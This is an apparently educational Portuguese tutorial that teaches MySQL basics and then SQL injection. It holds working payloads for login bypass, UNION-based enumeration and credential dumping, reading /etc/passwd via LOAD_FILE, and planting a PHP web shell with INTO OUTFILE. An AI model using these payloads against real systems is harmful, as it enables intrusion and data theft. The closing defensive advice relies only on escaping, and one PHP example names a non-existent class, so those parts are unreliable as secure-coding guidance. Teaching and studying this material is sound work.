# 💉 SQL

---

# 📖 Introdução

O banco de dados é utilizado para tornar aplicações dinâmicas.

O backend envia consultas ao banco de dados para:

* recuperar informações,
* armazenar dados,
* montar respostas para o usuário.

---

# 🔄 Fluxo de funcionamento

```text id="q51mp6"
Cliente/Navegador → Servidor → Banco de Dados
Banco de Dados → Servidor → Cliente
```

### 📌 Exemplo:

1. Usuário pesquisa um produto
2. O servidor consulta o banco
3. O resultado é devolvido ao navegador

---

# ⚠️ Onde nasce o problema

Assim como em outras vulnerabilidades de injection (ex: XSS), o problema é:

* confiança excessiva no input do usuário.

A aplicação:

* recebe dados do usuário,
* monta uma query SQL,
* envia diretamente ao banco.

Um atacante pode manipular essa query e injetar comandos SQL.

---

# 🗄️ Tipos de Banco de Dados

## 📚 Relacional

Usa SQL.

Exemplos:

* MySQL
* MariaDB
* PostgreSQL

---

## 📦 Não Relacional (NoSQL)

Não utiliza SQL tradicional.

Exemplos:

* MongoDB
* Redis

---

# 🧠 Linguagem SQL

SQL é utilizada para:

* recuperar dados,
* atualizar dados,
* excluir registros,
* criar tabelas,
* criar databases,
* adicionar usuários,
* controlar permissões.

---

# ⚙️ Sistemas Gerenciadores de Banco (SGBD)

São softwares que entendem SQL.

## Exemplos:

* MySQL
* MariaDB
* PostgreSQL

---

# 🐬 Instalando MySQL

## 📥 Instalação

```bash id="v9y1h4"
sudo apt install mysql-server -y
```

---

## 🔍 Verificar status

```bash id="z8vqmw"
sudo systemctl status mysql
```

---

## 🖥️ Acessar o banco

```bash id="8vkhru"
sudo mysql
```

---

## 🌐 Porta padrão

```text id="9lh8z0"
3306
```

### Opções:

* `-P` → alterar porta
* `-h` → alterar host

---

# 🏗️ Criando Database

## ➕ Criar banco

```sql id="7wgf2o"
CREATE DATABASE users;
```

---

## 📋 Mostrar databases

```sql id="p3p5pv"
SHOW DATABASES;
```

---

## 🚪 Entrar em um database

```sql id="tmx5hj"
USE users;
```

---

## 🔎 Descobrir database atual

```sql id="yqu3jg"
SELECT DATABASE();
```

---

# 🧱 Tabelas

As tabelas armazenam dados organizados em colunas.

Cada coluna possui um tipo específico:

* números,
* strings,
* datas,
* horas,
* dados binários.

---

# 🛠️ Criando tabela

```sql id="8gnbq0"
CREATE TABLE logins(
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
);
```

---

# 📑 Mostrar tabelas

```sql id="s7i8ho"
SHOW TABLES;
```

---

# 🔬 Ver estrutura da tabela

```sql id="92igzv"
DESCRIBE logins;
```

---

# 🔐 Propriedades importantes

## 🚫 NOT NULL

Campo obrigatório.

```sql id="d7i3y2"
id INT NOT NULL
```

---

## 🔢 AUTO_INCREMENT

Incrementa automaticamente.

```sql id="fhtw1t"
id INT AUTO_INCREMENT
```

---

## 🆔 UNIQUE

Valor único.

```sql id="m4j11v"
username VARCHAR(100) UNIQUE
```

---

## 🕒 DEFAULT

Valor padrão.

```sql id="5pyd0o"
date_of_joining DATETIME DEFAULT NOW()
```

---

## 🔑 PRIMARY KEY

Identificador único.

```sql id="8c6g9m"
PRIMARY KEY(id)
```

---

# 🧩 Alterando tabelas

## ➕ Adicionar chave primária

```sql id="d6q1g4"
ALTER TABLE logins ADD PRIMARY KEY(id);
```

---

## ➕ Adicionar coluna

```sql id="c4r6fd"
ALTER TABLE logins ADD COLUMN cpf VARCHAR(11);
```

---

## ✏️ Modificar coluna

```sql id="28jk9z"
ALTER TABLE logins MODIFY COLUMN id INT AUTO_INCREMENT;
```

---

## 🏷️ Renomear coluna

```sql id="v5z7z0"
ALTER TABLE logins RENAME COLUMN username TO user;
```

---

# 📜 SQL Statements

---

# ➕ INSERT

Adicionar registros.

```sql id="bbrjzq"
INSERT INTO logins VALUES (1, 'admin', 'password', '2026-05-02');
```

---

## 🎯 Inserindo colunas específicas

```sql id="trgx59"
INSERT INTO logins(username,password)
VALUES ('admin','password');
```

---

## ⚠️ Importante

Senhas devem ser:

* criptografadas,
* armazenadas com hash.

---

# 🔍 SELECT

Recuperar dados.

---

## 📦 Todos os registros

```sql id="v2m2m5"
SELECT * FROM logins;
```

---

## 🎯 Colunas específicas

```sql id="9hwb3w"
SELECT username,id FROM logins;
```

---

## 🌐 Consultar tabela de outro database

```sql id="a2qmdv"
SELECT * FROM cliente.pedidos;
```

---

# ❌ DROP

Remove tabelas.

```sql id="d4w3ic"
DROP TABLE logins;
```

---

# 🔄 UPDATE vs ALTER

| Comando | Função         |
| ------- | -------------- |
| ALTER   | Muda estrutura |
| UPDATE  | Muda dados     |

---

## ✏️ UPDATE

```sql id="81vwk5"
UPDATE logins
SET username='linive cristine'
WHERE id=1;
```

---

# 📊 Ordenando resultados

## 🔽 ORDER BY

```sql id="9e2m3q"
SELECT * FROM logins ORDER BY password;
```

---

## ⬇️ Ordem decrescente

```sql id="p6dz3z"
SELECT * FROM logins ORDER BY id DESC;
```

---

# 🎚️ Limitando resultados

## 🔢 LIMIT

```sql id="7ax4jx"
SELECT * FROM logins LIMIT 2;
```

Retorna:

* os 2 primeiros registros.

---

## ⏭️ OFFSET + LIMIT

```sql id="qbm8p6"
SELECT * FROM logins LIMIT 1,2;
```

Pula:

* 1 registro

Retorna:

* os próximos 2.

---

# 🎯 Cláusula WHERE

Filtrar registros.

```sql id="3cbwqe"
SELECT username,id
FROM logins
WHERE id > 1;
```

---

# 🔎 Cláusula LIKE

Buscar padrões.

---

## 🧩 Começa com “admin”

```sql id="6d9x1f"
SELECT * FROM logins
WHERE username LIKE 'admin%';
```

`%` = curinga

---

## 🔤 Exatamente 3 caracteres

```sql id="tm58jk"
SELECT * FROM logins
WHERE username LIKE '___';
```

`_` = um caractere

---

# ⚡ Operadores SQL

## 🧠 Operadores lógicos

* AND
* OR
* NOT

Símbolos:

* `&&`
* `||`
* `!`

---

## 🧪 Exemplo

```sql id="v9h8o4"
SELECT * FROM logins
WHERE username != 'paulo'
AND id > 10;
```

---

# 🧮 Outros operadores

| Operador | Função        |
| -------- | ------------- |
| +        | soma          |
| -        | subtração     |
| *        | multiplicação |
| /        | divisão       |
| %        | módulo        |
| =        | igual         |
| > <      | comparação    |
| >= <=    | comparação    |
| !=       | diferente     |
| LIKE     | padrões       |

---

# 💉 Introdução ao SQL Injection

---

# 🌐 Como aplicações usam SQL

Depois que o MySQL é instalado:

* aplicações podem armazenar,
* recuperar dados do banco.

---

# 🐘 Exemplo em PHP

```php id="9v9hr2"
$conn = new mysql("localhost","root","password","users");

$query = "SELECT * FROM logins";

$result = $conn->query($query);
```

---

# 📥 Lendo resultados

```php id="f7tgqm"
while($row = $result->fetch_assoc()){
    echo $row["name"];
}
```

---

# 🧠 fetch_assoc()

Transforma uma linha em:

* array associativo.

Exemplo:

```php id="rqg6x4"
$row["username"]
```

---

# 📨 Recuperando dados do usuário

Aplicações frequentemente usam input do usuário:

```php id="f97sp0"
$searchInput = $_POST['findUser'];

$query = "SELECT * FROM logins
WHERE username LIKE '%$searchInput%'";

$result = $conn->query($query);
```

---

# 🚨 Problema

O input foi inserido diretamente na query.

Isso é perigoso.

---

# 🧬 Tipos de SQL Injection

---

# 📡 IN-BAND

A saída aparece no front-end.

---

## 🔗 UNION BASED

Injeta queries usando UNION.

---

## 💥 ERROR BASED

Força erros para obter informações.

---

# 🕶️ BLIND SQLi

Não vemos a saída diretamente.

---

## ✅ BOOLEAN BASED

Usa respostas TRUE/FALSE.

---

## ⏳ TIME BASED

Usa delays (`SLEEP()`).

---

# 📤 OUT-OF-BAND

A saída é enviada para:

* servidor remoto,
* DNS,
* HTTP externo.

---

# 🎯 Foco inicial

O tipo mais comum para aprendizado inicial:

## 🔗 UNION BASED SQL Injection

Porque:

* é visual,
* fácil de entender,
* mostra claramente como os dados são extraídos.


---

# 🧠 Subvertendo a lógica da consulta

---

# 🔓 Ignorando autenticação

Precisamos fazer a condição retornar:

```text id="n5m7hj"
TRUE
```

independentemente do usuário e senha.

---

# 💥 Payload clássico

```sql id="3v7jdx"
admin' OR 1=1;#
```

---

# 📌 O que acontece

A query pode virar:

```sql id="7mxzjw"
SELECT * FROM logins
WHERE username='admin'
OR 1=1;#
```

`1=1` sempre será verdadeiro.

---

# 🌐 URL Encoding

Se o payload passar via GET:

| Caractere | Encode |
| --------- | ------ |
| `'`       | `%27`  |
| `#`       | `%23`  |

---

# 💬 Comentários SQL

Comentários ignoram o restante da query.

---

## Exemplos

```sql id="5rm0xw"
#
-- -
```

---

# 📌 Exemplo

```sql id="9grh4n"
admin' OR 1=1#
```

Tudo após `#` será ignorado.

---

# 🧮 Usando parênteses

Parênteses definem precedência lógica.

---

## Exemplo

```sql id="bcm0lh"
SELECT * FROM logins
WHERE (username='admin' AND id>1)
AND password='123';
```

O conteúdo dentro de `()` será analisado primeiro.

---

# 💣 Parênteses + comentários

```sql id="7z9ksj"
SELECT * FROM logins
WHERE (username='admin' AND id>1);#
AND password='123';
```

O campo senha será ignorado.

---

# 🔐 Observação

Senhas normalmente:

* são criptografadas,
* usam hash.

Por isso geralmente o ataque foca:

* na lógica da consulta,
* não diretamente no campo senha.

---

# 🔗 Cláusula UNION

`UNION` combina múltiplos `SELECTs`.

---

# 📌 Exemplo

```sql id="g4klv9"
SELECT * FROM tabela1
UNION
SELECT * FROM tabela2;
```

---

# ⚠️ Regras importantes do UNION

Os dois SELECTs precisam ter:

✅ Mesmo número de colunas
✅ Tipos de dados compatíveis

---

# ❌ UNION dentro de parênteses

`UNION` não pode ficar:

* dentro de `()`.

---

# 🧪 Exemplo de ajuste de colunas

Tabela 1:

* 6 colunas

Tabela 2:

* 2 colunas

---

## Ajustando manualmente

```sql id="3kk0z5"
SELECT * FROM employees
UNION
SELECT num_depart, name_depart, 3,4,5,6
FROM departments;
```

Os números são placeholders.

---

# 💉 UNION Injection

Agora utilizamos o UNION:

* para injetar consultas maliciosas.

---

# 🔍 Descobrindo quantidade de colunas

Precisamos saber:

* quantas colunas a query original retorna.

---

# 📊 Método ORDER BY

---

## Exemplo

```sql id="cz8n8o"
ORDER BY 1#
ORDER BY 2#
ORDER BY 3#
```

---

# 📌 Estratégia

Continuamos aumentando:

* até ocorrer erro.

O número que gera erro:

* não existe.

---

# 🔢 Método UNION SELECT

---

## Exemplo

```sql id="jlwmjd"
' UNION SELECT 1,2,3,4#
```

Tentamos diferentes quantidades:

* até funcionar.

---

# 🖥️ Local da injeção

Nem todas as colunas aparecem na tela.

Precisamos descobrir:

* quais colunas são visíveis.

---

# 🔎 Exemplos úteis

## Versão do banco

```sql id="v7m9tr"
' UNION SELECT 1,@@version,3,4#
```

---

## Database atual

```sql id="l3lqq7"
' UNION SELECT 1,database(),3,4#
```

---

## Usuário atual

```sql id="d4mkl0"
' UNION SELECT 1,user(),3,4#
```

---

# 🗂️ Enumeração do banco de dados

---

# 🧠 Descobrindo o SGBD

Cada banco possui:

* funções,
* sintaxe,
* tabelas específicas.

---

# 🐬 Testes MySQL

---

## Versão

```sql id="ghxq9j"
SELECT @@version
```

---

## Teste numérico

```sql id="rkkxcn"
SELECT POW(1,1)
```

MySQL:

* retorna `1`.

---

## Blind SQLi

```sql id="f6lh0l"
SELECT SLEEP(5)
```

A resposta demora:

* 5 segundos.

---

# 🗃️ INFORMATION_SCHEMA

Database especial que contém:

* databases,
* tabelas,
* colunas,
* metadados.

---

# 🌐 Acessando tabelas de outros databases

Usamos:

```sql id="ny20xk"
database.tabela
```

---

## Exemplo

```sql id="prz9w7"
SELECT * FROM products.prices;
```

---

# 🏛️ information_schema.schemata

Lista:

* todos os databases do servidor.

---

## Exemplo

```sql id="hk6kmq"
' UNION SELECT 1,schema_name,3,4
FROM information_schema.schemata#
```

---

# 📌 Database atual

```sql id="5gsl7k"
' UNION SELECT 1,database(),3,4#
```

---

# 📑 Listando tabelas

Usamos:

```text id="p5rmtm"
information_schema.tables
```

---

## Colunas importantes

| Coluna       | Função         |
| ------------ | -------------- |
| table_name   | nome da tabela |
| table_schema | database       |

---

## Exemplo

```sql id="0gr4x1"
' UNION SELECT 1,table_name,3,4
FROM information_schema.tables
WHERE table_schema='nome_db'#
```

---

# 🧱 Listando colunas

Usamos:

```text id="0n5gk8"
information_schema.columns
```

---

## Exemplo

```sql id="lhgc4m"
' UNION SELECT 1,column_name,3,4
FROM information_schema.columns
WHERE table_name='credentials'#
```

---

# 🔓 Acessando dados

Agora já sabemos:

* databases,
* tabelas,
* colunas.

---

## Exemplo

```sql id="5j0qz6"
' UNION SELECT 1,username,password,4
FROM dev.credentials#
```

---

# 📂 SQLi e leitura de arquivos

SQL Injection pode:

* ler arquivos,
* escrever arquivos,
* executar código.

---

# 👤 Usuários e privilégios

Precisamos descobrir:

* qual usuário somos,
* quais permissões temos.

---

# 🔍 Descobrir usuário

```sql id="9sjlgw"
SELECT USER()
```

---

## Via SQLi

```sql id="l6v6qn"
' UNION SELECT 1,user,3,4
FROM mysql.user#
```

---

# 🔐 Verificar privilégios

```sql id="0s2t7m"
' UNION SELECT 1,super_priv,3,4
FROM mysql.user
WHERE user='meu_user'#
```

---

# 📌 Resultado

| Valor | Significado        |
| ----- | ------------------ |
| Y     | possui privilégios |
| N     | não possui         |

---

# 📋 Descobrindo permissões

```sql id="lxh19p"
' UNION SELECT 1,grantee,privilege_type,4
FROM information_schema.user_privileges
WHERE grantee="'usuario'@'host'"#
```

---

# 📂 Privilégio FILE

Se aparecer:

```text id="jlwmg9"
FILE
```

Podemos:

* ler arquivos,
* talvez escrever arquivos.

---

# 📖 Lendo arquivos

Usamos:

```sql id="2t9t9f"
LOAD_FILE()
```

---

## Exemplo

```sql id="kpp5hk"
' UNION SELECT 1,
LOAD_FILE('/etc/passwd'),
3,4#
```

---

# 🧾 Vazando código fonte

```sql id="vpsx6p"
' UNION SELECT 1,
LOAD_FILE('/var/www/html/search.php'),
3,4#
```

---

# 🎯 Objetivo

Encontrar:

* credenciais,
* arquivos de conexão,
* senhas do banco.

---

# ✍️ Escrevendo arquivos

Mais restrito em SGBDs modernos.

---

# ✅ Precisamos verificar

* privilégio FILE,
* secure_file_priv,
* caminho de escrita.

---

# 🔐 secure_file_priv

Define:

* onde podemos ler/escrever arquivos.

---

# 📌 Possíveis valores

| Valor   | Significado     |
| ------- | --------------- |
| caminho | pasta permitida |
| ""      | acesso liberado |
| NULL    | bloqueado       |

---

# 🔎 Descobrindo secure_file_priv

```sql id="zhk2ld"
' UNION SELECT 1,
variable_name,
variable_value,
4
FROM information_schema.global_variables
WHERE variable_name="secure_file_priv"#
```

---

# 💾 SELECT INTO OUTFILE

Salva o resultado da query em um arquivo.

---

## Exemplos

```sql id="31q0s4"
SELECT 'teste'
INTO OUTFILE '/tmp/test.txt';
```

---

## Via SQLi

```sql id="76d1b2"
' UNION SELECT 1,
'arquivo criado',
3,4
INTO OUTFILE '/var/www/html/teste.txt'#
```

---

# 🐚 Escrevendo WebShell

---

## Payload PHP

```php id="6cw2lv"
<?php system($_GET[0]);?>
```

---

## Injeção

```sql id="zlhfxv"
' UNION SELECT "",
'<?php system($_GET[0]);?>',
"",
""
INTO OUTFILE '/var/www/html/payload.php'#
```

---

# 🌐 Executando comandos

```text id="8f8j2v"
www.alvo.com/payload.php?0=ls -la
```

---

# 🛡️ Evitando SQL Injection

---

# ❌ Código vulnerável

```php id="vv5t07"
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM logins
WHERE username='".$username."'
AND password='".$password."'";
```

Input do usuário vai direto para a query.

---

# ✅ Código sanitizado

```php id="9c6pt1"
$username = mysqli_real_escape_string(
$conn,
$_POST['username']
);

$password = mysqli_real_escape_string(
$conn,
$_POST['password']
);
```

---

# 🧠 Sanitização

`mysqli_real_escape_string()`:

* escapa caracteres perigosos,
* reduz risco de SQL Injection.

---

